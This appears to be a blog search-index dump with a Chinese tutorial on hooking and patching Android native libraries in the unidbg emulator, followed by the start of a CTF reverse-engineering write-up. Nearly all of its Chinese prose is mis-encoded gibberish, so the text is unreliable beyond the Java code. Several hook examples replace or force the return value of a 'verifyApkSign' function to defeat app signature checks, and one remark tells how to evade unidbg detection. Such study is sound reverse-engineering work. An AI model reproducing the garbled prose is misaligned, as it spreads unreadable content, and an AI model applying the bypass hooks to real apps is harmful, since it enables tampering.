digest_ptr=digest.getPointer(); // å‡†å¤‡å…¥å‚ List&lt;Object> args = new ArrayList&lt;>(); args.add(initial_msg); args.add(initial_length); args.add(digest_ptr); // æ‰§è¡Œ module.callFunction(emulator, 0x7A8D + 1, args.toArray()); // æ‰“å°ç»“æœ Inspector.inspect(digest_ptr.getByteArray(0, 0x10), \"digest\");&#125;# unidbg hook Unidbg åœ¨ Android ä¸Šæ”¯æŒçš„ Hookï¼Œå¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±» Unidbg å†…ç½®çš„ç¬¬ä¸‰æ–¹ Hook æ¡†æ¶ï¼ŒåŒ…æ‹¬ xHook/Whale/HookZz Unicorn Hook ä»¥åŠ Unidbg åŸºäºå®ƒå°è£…çš„ Console Debugger é€‰ç”¨å“ªç§ hook æ¡†æ¶ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ç‚¹ å¦‚æœä»¥æ¨¡æ‹Ÿæ‰§è¡Œä¸ºç›®çš„ï¼Œå»ºè®®ä½¿ç”¨ç¬¬ä¸‰æ–¹ Hook æ–¹æ¡ˆï¼Œarm32 ä¸‹ HookZz çš„æ”¯æŒè¾ƒå¥½ï¼Œarm64 ä¸‹ Dobby çš„æ”¯æŒè¾ƒå¥½ï¼ŒHookZz/Dobby Hook ä¸æˆåŠŸæ—¶ï¼Œå¦‚æœå‡½æ•°æ˜¯å¯¼å‡ºå‡½æ•°ï¼Œä½¿ç”¨ xHookï¼Œå¦åˆ™ä½¿ç”¨ Whaleã€‚ å¦‚æœä»¥ç®—æ³•è¿˜åŸä¸ºç›®çš„ï¼Œå»ºè®®ä½¿ç”¨ Console Debugger å’Œ Unicorn Hookï¼Œå¹¶å»ºè®®ä¸ä¼˜å…ˆä½¿ç”¨ç¬¬ä¸‰æ–¹ Hook æ–¹æ¡ˆã€‚ # åŸºç¡€çŸ¥è¯† # è·å– so çš„åŸºå€ åŠ è½½ä¸€ä¸ª so // åŠ è½½ so åˆ°è™šæ‹Ÿå†…å­˜DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// åŠ è½½å¥½çš„ so å¯¹åº”ä¸ºä¸€ä¸ªæ¨¡å—module = dm.getModule();// æ‰“å° libnative-lib.so åœ¨ Unidbg è™šæ‹Ÿå†…å­˜ä¸­çš„åŸºåœ°å€System.out.println(\"baseAddr:\"+module.base);åŠ è½½å¤šä¸ª so // è·å–æŸä¸ªå…·ä½“ SO çš„å¥æŸ„Module yourModule = emulator.getMemory().findModule(\"yourModuleName\");// æ‰“å°å…¶åŸºåœ°å€System.out.println(\"baseAddr:\"+yourModule.base);å¦‚æœåªä¸»åŠ¨åŠ è½½ä¸€ä¸ª soï¼Œå…¶åŸºå€æ’ä¸º 0x40000000 , è¿™æ˜¯ä¸€ä¸ªæ£€æµ‹ Unidbg çš„ç‚¹ï¼Œå¯ä»¥åœ¨ com/github/unidbg/memory/Memory.java ä¸­åšä¿®æ”¹ public interface Memory extends IO, Loader, StackMemory &#123; long STACK_BASE = 0xc0000000L; int STACK_SIZE_OF_PAGE = 256; // 1024k // ä¿®æ”¹å†…å­˜æ˜ å°„çš„èµ·å§‹åœ°å€ long MMAP_BASE = 0x40000000L; UnidbgPointer allocateStack(int size); UnidbgPointer pointer(long address); void setStackPoint(long sp);&#125;# è·å–å¯¼å‡ºå‡½æ•°åœ°å€ // åŠ è½½ so åˆ°è™šæ‹Ÿå†…å­˜DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// åŠ è½½å¥½çš„ libnative-lib.so å¯¹åº”ä¸ºä¸€ä¸ªæ¨¡å—module = dm.getModule();int address = (int) module.findSymbolByName(\"funcNmae\").getAddress();# è·å–éå¯¼å‡ºå‡½æ•°åœ°å€ // åŠ è½½ so åˆ°è™šæ‹Ÿå†…å­˜DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// åŠ è½½å¥½çš„ so å¯¹åº”ä¸ºä¸€ä¸ªæ¨¡å—module = dm.getModule();//offsetï¼Œåœ¨ IDA ä¸­æŸ¥çœ‹int offset = 0x1768;// çœŸå®åœ°å€ = baseAddr + offsetint address = (int) (module.base + offset);# Console Debugger # åŸºç¡€ hook ä½¿ç”¨ Console Debugger ä¸‹æ–­ç‚¹ // debugemulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress()); è¿è¡Œåˆ°å¯¹åº”åœ°å€æ—¶è§¦å‘æ–­ç‚¹ï¼Œç±»ä¼¼äº GDB è°ƒè¯•æˆ–è€… IDA è°ƒè¯•ï¼Œæ—¶æœºä¸ºç›®æ ‡æŒ‡ä»¤æ‰§è¡Œå‰ Console Debugger ç”¨äºè¾…åŠ©ç®—æ³•åˆ†æï¼Œå¿«é€Ÿåˆ†æã€ç¡®è®¤æŸä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚å¹¶ä¸”åªèƒ½åœ¨ Unicorn å¼•æ“ä¸‹æ‰å¯ä»¥ä½¿ç”¨ äº¤äº’å‘½ä»¤ c: continuen: step overbt: back tracest hex: search stackshw hex: search writable heapshr hex: search readable heapshx hex: search executable heapnb: break at next blocks|si: step intos[decimal]: execute specified amount instructions(blx): execute util BLX mnemonic, low performancem(op) [size]: show memory, default size is 0x70, size may hex or decimalmr0-mr7, mfp, mip, msp [size]: show memory of specified registerm(address) [size]: show memory of specified address, address must start with 0xwr0-wr7, wfp, wip, wsp &lt;value>: write specified registerwb(address), ws(address), wi(address) &lt;value>: write (byte, short, integer) memory of specified address, address must start with 0xwx(address) &lt;hex>: write bytes to memory at specified address, address must start with 0xb(address): add temporarily breakpoint, address must start with 0x, can be module offsetb: add breakpoint of register PCr: remove breakpoint of register PCblr: add temporarily breakpoint of register LRp (assembly): patch assembly at PC addresswhere: show java stack tracetrace [begin end]: Set trace instructionstraceRead [begin end]: Set trace memory readtraceWrite [begin end]: Set trace memory writevm: view loaded modulesvbs: view breakpointsd|dis: show disassembled(0x): show disassemble at specify addressstop: stop emulationrun [arg]: run testcc size: convert asm from 0x400008a0 - 0x400008a0 + size bytes to c functionæŒä¹…åŒ– hook onHit è¿”å› ture æ—¶ï¼Œæ–­ç‚¹è§¦å‘æ—¶ä¸ä¼šè¿›å…¥äº¤äº’ç•Œé¢ï¼›ä¸º false æ—¶ä¼šã€‚å½“å‡½æ•°è¢«è°ƒç”¨äº†ä¸‰äº”ç™¾æ¬¡æ—¶ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›å®ƒåå¤åœä¸‹æ¥ï¼Œç„¶åä¸åœ â€œcâ€ æ¥ç»§ç»­è¿è¡Œã€‚ public void HookByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; String result = buffer.getString(0); System.out.println(\"base64 result:\"+result); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# ä¿®æ”¹å‚æ•° ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œä»£ç åè¿›å…¥ debugger emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress()); é€šè¿‡å‘½ä»¤ä¿®æ”¹å‚æ•° 1 å’Œ 2 wx0x40002403 68656c6c6f20776f726c64>-----------------------------------------------------------------------------&lt;[14:06:46 165]RX@0x40002403[libhookinunidbg.so]0x2403, md5=5eb63bbbe01eeed093cb22bb8f5acdc3, hex=68656c6c6f20776f726c64size: 110000: 68 65 6C 6C 6F 20 77 6F 72 6C 64 hello world^-----------------------------------------------------------------------------^wr1 11>>> r1=0xbConsole Debugger æ”¯æŒä¸‹åˆ—å†™æ“ä½œ wr0-wr7, wfp, wip, wsp &lt;value>: write specified registerwb(address), ws(address), wi(address) &lt;value>: write (byte, short, integer) memory of specified address, address must start with 0xwx(address) &lt;hex>: write bytes to memory at specified address, address must start with 0xæŒä¹…åŒ–ä¸­çš„ä¿®æ”¹å‚æ•° public void ReplaceArgByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); String fakeInput = \"hello world\"; int length = fakeInput.length(); // ä¿®æ”¹ r1 å€¼ä¸ºæ–°é•¿åº¦ emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R1, length); MemoryBlock fakeInputBlock = emulator.getMemory().malloc(length, true); fakeInputBlock.getPointer().write(fakeInput.getBytes(StandardCharsets.UTF_8)); // ä¿®æ”¹ r0 ä¸ºæŒ‡å‘æ–°å­—ç¬¦ä¸²çš„æ–°æŒ‡é’ˆ emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, fakeInputBlock.getPointer().peer); Pointer buffer = context.getPointerArg(2); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; String result = buffer.getString(0); System.out.println(\"base64 result:\"+result); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# ä¿®æ”¹è¿”å›å€¼ public void ReplaceRetByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"verifyApkSign\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# æ›¿æ¢å‡½æ•° public void ReplaceFuncByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"verifyApkSign\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; System.out.println(\"æ›¿æ¢å‡½æ•° verifyApkSign\"); RegisterContext registerContext = emulator.getContext(); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC, registerContext.getLRPointer().peer); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); return true; &#125; &#125;);&#125;# Unicorn Hook public void HookByUnicorn()&#123; long start = module.base+0x97C; long end = module.base+0x97C+0x17A; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; RegisterContext registerContext = emulator.getContext(); if(address == module.base + 0x97C)&#123; int r0 = registerContext.getIntByReg(ArmConst.UC_ARM_REG_R0); System.out.println(\"0x97C å¤„ r0:\"+Integer.toHexString(r0)); &#125; //capstone å¼•æ“çš„ä½¿ç”¨ Capstone capstone = new Capstone(Capstone.CS_ARCH_ARM64,Capstone.CS_MODE_ARM); byte[] bytes = emulator.getBackend().mem_read(address, 4); Instruction[] disasm = capstone.disasm(bytes, 0); &#125; @Override public void onAttach(Unicorn.UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, start, end, null);&#125;# xHook xHook æ˜¯çˆ±å¥‡è‰ºå¼€æºçš„ Android PLT hook æ¡†æ¶ï¼Œä¼˜ç‚¹æ˜¯æŒºç¨³å®šå¥½ç”¨ï¼Œç¼ºç‚¹æ˜¯ä¸èƒ½ Hook Sub_xxx å­å‡½æ•°ã€‚ # åŸºç¡€ hook public void HookByXhook()&#123; IxHook xHook = XHookImpl.getInstance(emulator); xHook.register(\"libhookinunidbg.so\", \"base64_encode\", new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); context.push(buffer); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true); // ä½¿å…¶ç”Ÿæ•ˆ xHook.refresh();&#125;# ä¿®æ”¹å‚æ•° public void ReplaceArgByXhook()&#123; IxHook xHook = XHookImpl.getInstance(emulator); xHook.register(\"libhookinunidbg.so\", \"base64_encode\", new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; String fakeInput = \"hello world\"; int length = fakeInput.length(); // ä¿®æ”¹ r1 å€¼ä¸ºæ–°é•¿åº¦ emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R1, length); MemoryBlock fakeInputBlock = emulator.getMemory().malloc(length, true); fakeInputBlock.getPointer().write(fakeInput.getBytes(StandardCharsets.UTF_8)); // ä¿®æ”¹ r0 ä¸ºæŒ‡å‘æ–°å­—ç¬¦ä¸²çš„æ–°æŒ‡é’ˆ emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, fakeInputBlock.getPointer().peer); Pointer buffer = context.getPointerArg(2); context.push(buffer); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true); // ä½¿å…¶ç”Ÿæ•ˆ xHook.refresh();&#125;# æ›¿æ¢å‡½æ•° public void ReplaceFuncByHookZz()&#123; HookZz hook = HookZz.getInstance(emulator); hook.replace(module.findSymbolByName(\"verifyApkSign\").getAddress(), new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; emulator.getBackend().reg_write(Unicorn.UC_ARM_REG_R0,0); return HookStatus.RET(emulator,context.getLR()); &#125; &#125;);&#125;# HookZz HookZz ç°åœ¨å« Dobbyï¼ŒUnidbg ä¸­æ˜¯ HookZz å’Œ Dobby æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ Hook åº“ï¼Œå› ä¸ºä½œè€…è®¤ä¸º HookZz åœ¨ arm32 ä¸Šæ”¯æŒè¾ƒå¥½ï¼ŒDobby åœ¨ arm64 ä¸Šæ”¯æŒè¾ƒå¥½ã€‚HookZz æ˜¯ inline hook æ–¹æ¡ˆï¼Œå› æ­¤å¯ä»¥ Hook Sub_xxxï¼Œç¼ºç‚¹æ˜¯çŸ­å‡½æ•°å¯èƒ½å‡º bugï¼Œå—é™äº inline Hook åŸç†ã€‚ # åŸºç¡€ hook public void HookByHookZz()&#123; IHookZz hookZz = HookZz.getInstance(emulator); // åŠ è½½ HookZzï¼Œæ”¯æŒ inline hook hookZz.enable_arm_arm64_b_branch(); // æµ‹è¯• enable_arm_arm64_b_branchï¼Œå¯æœ‰å¯æ—  hookZz.wrap(module.findSymbolByName(\"base64_encode\"), new WrapCallback&lt;HookZzArm32RegisterContext>() &#123; @Override public void preCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); context.push(buffer); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;); hookZz.disable_arm_arm64_b_branch();&#125;# ä¿®æ”¹å‚æ•° public void ReplaceArgByHookZz()&#123; IHookZz hookZz = HookZz.getInstance(emulator); // åŠ è½½ HookZzï¼Œæ”¯æŒ inline hook hookZz.enable_arm_arm64_b_branch(); // æµ‹è¯• enable_arm_arm64_b_branchï¼Œå¯æœ‰å¯æ—  hookZz.wrap(module.findSymbolByName(\"base64_encode\"), new WrapCallback&lt;HookZzArm32RegisterContext>() &#123; @Override public void preCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer input = context.getPointerArg(0); String fakeInput = \"hello world\"; input.setString(0, fakeInput); context.setR1(fakeInput.length()); Pointer buffer = context.getPointerArg(2); context.push(buffer); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;); hookZz.disable_arm_arm64_b_branch();&#125;# Whale Whale æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„ Hook æ¡†æ¶ï¼Œåœ¨ Andorid Native Hook ä¸Šä¹Ÿæ˜¯ inline Hook æ–¹æ¡ˆ public void HookByWhale()&#123; IWhale whale = Whale.getInstance(emulator); whale.inlineHookFunction(module.findSymbolByName(\"base64_encode\"), new ReplaceCallback() &#123; Pointer buffer; @Override public HookStatus onCall(Emulator&lt;?> emulator, long originFunction) &#123; RegisterContext context = emulator.getContext(); Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true);&#125;# unidbg å¸¸ç”¨è„šæœ¬ # Patch æ–¹æ³•ä¸€ public void Patch1()&#123; // 00 20 00 bf int patchCode = 0xBF002000; // movs r0,0 emulator.getMemory().pointer(module.base + 0x8CA).setInt(0,patchCode);&#125; æ–¹æ³•äºŒ public void Patch2()&#123; byte[] patchCode = &#123;0x00, 0x20, 0x00, (byte) 0xBF&#125;; emulator.getBackend().mem_write(module.base + 0x8CA, patchCode);&#125; æ–¹æ³•ä¸‰ public void Patch3()&#123; try (Keystone keystone = new Keystone(KeystoneArchitecture.Arm, KeystoneMode.ArmThumb)) &#123; KeystoneEncoded encoded = keystone.assemble(\"movs r0,0;nop\"); byte[] patchCode = encoded.getMachineCode(); emulator.getMemory().pointer(module.base + 0x8CA).write(0, patchCode, 0, patchCode.length); &#125;&#125; # å†…å­˜æ£€ç´¢ public void SearchAndPatch()&#123; byte[] patterns = &#123;(byte) 0x80, (byte) 0xb5,0x6f,0x46, (byte) 0x84, (byte) 0xb0,0x03, (byte) 0x90,0x02, (byte) 0x91&#125;; Collection&lt;Pointer> pointers = searchMemory(module.base, module.base+module.size, patterns); if(pointers.size() > 0)&#123; try (Keystone keystone = new Keystone(KeystoneArchitecture.Arm, KeystoneMode.ArmThumb)) &#123; KeystoneEncoded encoded = keystone.assemble(\"movs r0,0;nop\"); byte[] patchCode = encoded.getMachineCode(); ((ArrayList&lt;Pointer>) pointers).get(0).write(10, patchCode, 0, patchCode.length); &#125; &#125;&#125;private Collection&lt;Pointer> searchMemory(long start, long end, byte[] data) &#123; List&lt;Pointer> pointers = new ArrayList&lt;>(); for (long i = start, m = end - data.length; i &lt; m; i++) &#123; byte[] oneByte = emulator.getBackend().mem_read(i, 1); if (data[0] != oneByte[0]) &#123; continue; &#125; if (Arrays.equals(data, emulator.getBackend().mem_read(i, data.length))) &#123; pointers.add(UnidbgPointer.pointer(emulator, i)); i += (data.length - 1); &#125; &#125; return pointers;&#125;# å‚è€ƒèµ„æ–™ Unidbg æ–‡æ¡£æ›´æ–° (ä¸€) Unidbg æ–‡æ¡£æ…¢æ›´ (äºŒ) Unidbg Hook å¤§å…¨","categories":[],"tags":[]},{"title":"CBCTF auuuu3å’Œvm_flutterå‡ºé¢˜æ€è·¯åŠwp","slug":"CBCTF-2023","date":"2023-10-23T06:42:47.000Z","updated":"2023-12-12T17:03:20.767Z","comments":true,"path":"CBCTF-2023/","link":"","permalink":"https://oacia.dev/CBCTF-2023/","excerpt":"","text":"å»å¹´ CBCTF çš„æ—¶å€™ï¼Œæˆ‘å½“æ—¶ä¸ºè¿™ä¸ªæ¯”èµ›å‡ºäº†ä¸€é“é€†å‘é¢˜å«åš CBNET , å¯æ˜¯ç›´åˆ°ç»“æŸä¹‹åæ‰ç»ˆäºæœ‰äº†ä¸€è§£ï¼Œæˆ‘é‚£æ—¶éå¸¸è‡ªè´£ï¼Œæ„Ÿè§‰è‡ªå·±æŠŠé¢˜ç›®å‡ºéš¾äº†å¯¼è‡´å¤§å®¶éƒ½åšä¸å‡ºæ¥ï¼Œé‚£æ¬¡æ¯”èµ›ç»“æŸä¹‹åå‡ ä¸ªå¸ˆå‚…æ‰¾æˆ‘é—®è¿™é¢˜ï¼Œæˆ‘å‘ç°åŸæ¥æ˜¯æˆ‘è‡ªå·±è®¾è®¡çš„è‡ªå®šä¹‰ç®—æ³•éš¾ä½äº†å¤§å®¶ï¼Œå¤§å®¶ä¸ä¼šå†™é€†å‘è„šæœ¬å¯¼è‡´çš„ã€‚æ‰€ä»¥ä»Šå¹´çš„ CBCTF, æˆ‘æ€»ç»“äº†å»å¹´å‡ºé¢˜çš„ç»éªŒï¼Œç»™è‡ªå·±ä»Šå¹´å‡ºé¢˜å®šçš„ç›®æ ‡çš„å°±æ˜¯å¸Œæœ›æ¯ä¸€ä¸ªäººéƒ½å¯ä»¥å»å°è¯•ç€å»åšä¸€ä¸‹ï¼Œå¹¶ä¸”ä¸åœ¨ç®—æ³•çš„å±‚é¢å»ä¸ºéš¾å¤§å®¶. auuuu3 çš„å‡ºé¢˜çµæ„Ÿä¸»è¦åœ¨ä¸ŠåŠå¹´çœ‹åˆ°è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œè¯´æ˜¯æœ‰ hacker åœ¨å‹ç¼©åŒ…é‡Œè—äº†ä¸€ä¸ªæ— æ¯’çš„ autoit exe è§£é‡Šå™¨ï¼Œç„¶åè¿™ä¸ªè§£é‡Šå™¨è¿è¡Œæ¶æ„çš„ au3 è„šæœ¬æ¥å®ç°æ¶æ„è¡Œä¸ºï¼Œå½“æ—¶æˆ‘å°±åœ¨æƒ³è¦æ˜¯æŠŠè¿™ä¸ª au3 è„šæœ¬ç¼–è¯‘æˆ exe ä¹‹åä¼šä¸ä¼šå¾ˆæœ‰è¶£å‘¢ï½æ‰€ä»¥å°±å¼€å§‹äº†å°è¯•ï¼Œå†™äº†ä¸€ä¸ª demo è‡ªå·±åšäº†ä¸€ä¸‹ï¼Œå‘ç°ç›´æ¥ç”¨ ida é€†å‘çš„éš¾åº¦ç›¸å½“çš„é«˜ï¼Œéœ€è¦æå¼ºçš„é€†å‘æ°´å¹³æ‰å¯ä»¥åšå‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘å°±å»ç½‘ä¸Šå¯»æ‰¾å¯ä»¥é€†å‘ autoit çš„å·¥å…·ï¼Œä¸€å¼€å§‹ç”¨å®˜æ–¹è‡ªå¸¦çš„ exe2aut æ˜¯å¯ä»¥æˆåŠŸå¾—åˆ°æºç çš„ï¼Œéšåæˆ‘å»ç¿»çœ‹äº† autoit å®˜æ–¹çš„æ–‡æ¡£ï¼Œå‘ç°è¿™ä¸ª exe2aut åœ¨ autoitv3.2.5.1 ä¹‹åå°±è¢«ç§»é™¤äº†ï¼Œä¸ºäº†ç¨ç¨å¢åŠ ä¸€äº›éš¾åº¦ï¼Œæ‰€ä»¥æˆ‘å°±é€‰ç”¨äº†é«˜ç‰ˆæœ¬çš„ autoit æ¥ç¼–è¯‘ exe, ç„¶åå°±å‘ç°ä¸ç®¡æ˜¯å®˜æ–¹çš„ exe2aut, è¿˜æ˜¯ github ä¸Šé«˜ star çš„ AutoDec , autoitqds , myAut2Exe è¿™äº›å·¥å…·å…¨éƒ¨éƒ½åç¼–è¯‘æºç æŠ¥é”™äº†ï¼Œæ­£å½“æˆ‘æ‹…å¿ƒè‡ªå·±åˆè¦æŠŠä¸­ç­‰é¢˜å‡ºæˆå›°éš¾é¢˜çš„æ—¶å€™ï¼Œæˆ‘åˆå‘ç°äº†ä¸€ä¸ªå·¥å…·ï¼Œä»–å« autoit-ripper , å¯ä»¥å®Œç¾çš„åç¼–è¯‘é«˜ç‰ˆæœ¬çš„ autoit, æ€è·¯ä¹Ÿæ˜¯è§£æ autoit è™šæ‹Ÿæœºï¼Œæœ‰å…´è¶£çš„å¯ä»¥å»çœ‹ä¸€çœ‹å®ƒçš„æºç ï¼Œè¿˜æ˜¯æŒºæœ‰è¶£çš„ï¼Œè‡³äºé€†å‘ç®—æ³•ï¼Œæˆ‘ä»…ä»…æ˜¯ç”¨ shellcode åŠ è½½äº†ä¸€ä¸ª dll, è¿™ä¸ª dll é‡Œé¢ä¹Ÿåªæœ‰ä¸€ä¸ª xxtea, åº”è¯¥é€†å‘èµ·æ¥æ˜¯éå¸¸è½»æ¾çš„ vm_flutter çš„å‡ºé¢˜çµæ„Ÿæ˜¯æˆ‘åœ¨å…«æœˆæœ«åšå®Œè…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›å®‰å“åˆèµ›é¢˜ä¹‹åï¼Œå¯¹è¿™é¢˜ä¸­çš„ vm æœ‰äº†è¾ƒæ·±çš„æ„Ÿæ‚Ÿä¹‹åå†³å®šè®¾è®¡çš„ï¼Œåœ¨è§£é‚£é¢˜çš„ vm çš„æ—¶å€™ï¼Œæˆ‘å¯¹äºå®ƒçš„ opcode æŒ‡ä»¤çœŸçš„æ˜¯å…¨ç„¶ä¸çŸ¥ï¼Œæ‰€ä»¥æˆ‘å» hook äº† vm ç›¸å…³çš„å‡½æ•°æˆåŠŸçš„è§£å‡ºäº† vm, è¦æ˜¯æƒ³çœ‹è¿™åœºæ¯”èµ›é¢˜è§£çš„å¯ä»¥ç§»æ­¥æˆ‘åšå®¢çš„è¿™ç¯‡æ–‡ç« ã€‚å›åˆ° vm_flutter, è¿™é¢˜åœ¨æ¯”èµ›ç»“æŸä¹‹ååªæœ‰ä¸€è§£æˆ‘æ„Ÿè§‰å…¶å®æŒºæ„å¤–çš„ï¼Œåº”è¯¥å¯ä»¥æœ‰æ›´å¤šäººå¯ä»¥åšå‡ºæ¥è¿™é¢˜ã€‚å‡º vm_flutter çš„æ—¶å€™ï¼Œæˆ‘æƒ³è¦è®¾è®¡ä¸€ä¸ªå¤§å®¶ä¸çŸ¥é“ opcode çš„ç¯å¢ƒï¼Œæˆ‘æƒ³æœ€å¥½çš„æ–¹æ³•å°±æ˜¯ç”¨ flutter æ¡†æ¶ï¼Œç„¶åæŠŠ opcode æ”¾åœ¨ dart å±‚ä¸­ï¼Œä½†æ˜¯æˆ‘åˆå¸Œæœ›å¤§å®¶å¯ä»¥å¾ˆå¿«çš„æ‰¾å‡º vm çš„å‡½æ•°æ¯”å¦‚ push , pop , add ç­‰ç­‰å‡½æ•°æ‰€åœ¨çš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å°†è¿™äº›å‡½æ•°å…¨éƒ¨éƒ½å®šä¹‰åœ¨äº† java å±‚ä¸­ï¼Œè¿™æ ·å¤§å®¶ç”¨ jadx æˆ– jeb åç¼–è¯‘ä¹‹åï¼Œå°±å¯ä»¥å¾ˆå¿«æ‰¾åˆ°ä»–ä»¬äº†ã€‚æ¥ä¸‹æ¥çš„éœ€è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è®© flutter çš„ dart å±‚å»è°ƒç”¨åŸç”Ÿå®‰å“ä¸­çš„ java å±‚ä¸­çš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ–¹æ³•æ˜¯æˆ‘ä¸ŠåŠå¹´åœ¨é€†å‘ä¸€ä¸ª flutter æ¡†æ¶çš„æ¸¸æˆå«åšè£…æ‰®å°‘å¥³çš„æ—¶å€™å­¦ä¹ åˆ°çš„ï¼Œè¿™ä¸ª app ä½¿ç”¨ MethodChannel ç®¡é“é€šä¿¡çš„æ–¹å¼å®ç° dart å±‚å’ŒåŸç”Ÿå®‰å“ä¹‹é—´çš„é€šä¿¡ï¼Œè€Œé€šè®¯çš„æ¶ˆæ¯æˆ‘ä¹Ÿæ²¡æœ‰ä¿®æ”¹ï¼Œç”šè‡³å­—ç¬¦ä¸²éƒ½æ˜¯ vm æœ‰å…³çš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯æ–¹æ³•åæ··æ·†å…¶å®æ˜¯åœ¨æˆ‘çš„é¢„æœŸä¹‹å¤–ï¼Œè¿™å…¶å®æ˜¯ build apk çš„æ—¶å€™ flutter è‡ªåŠ¨æŠŠæ–¹æ³•åæ··æ·†äº†çš„ï¼Œä¸æ˜¯æˆ‘å¹²çš„ï¼ï¼(æœ¬æ¥æˆ‘æ˜¯æƒ³è®©å¤§å®¶ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ java å±‚å‡½æ•°çš„å«ä¹‰çš„), ç„¶åæˆ‘è¿˜æŠŠæœ€ç»ˆçš„ check å‡½æ•°ä¹Ÿæ”¾åœ¨äº† java å±‚ä¸­ï¼Œè€Œä¸æ˜¯åœ¨ vm ä¸­å» check,dart å±‚é€šè¿‡ check çš„ç»“æœå»å¼¹å‡º right æˆ– wrong, æ‰€ä»¥è¿™æ ·åº”è¯¥èƒ½æ›´åŠ é™ä½å¤§å®¶è§£é¢˜çš„éš¾åº¦äº†ï½ # auuuu3 æœ¬é¢˜æ˜¯ç”± autoit ç¼–å†™è€Œæˆçš„ exeï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œé€šè¿‡è§£æ autoit åŠ¨æ€è„šæœ¬è¯­è¨€æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå€˜è‹¥ä½¿ç”¨ IDA æˆ– 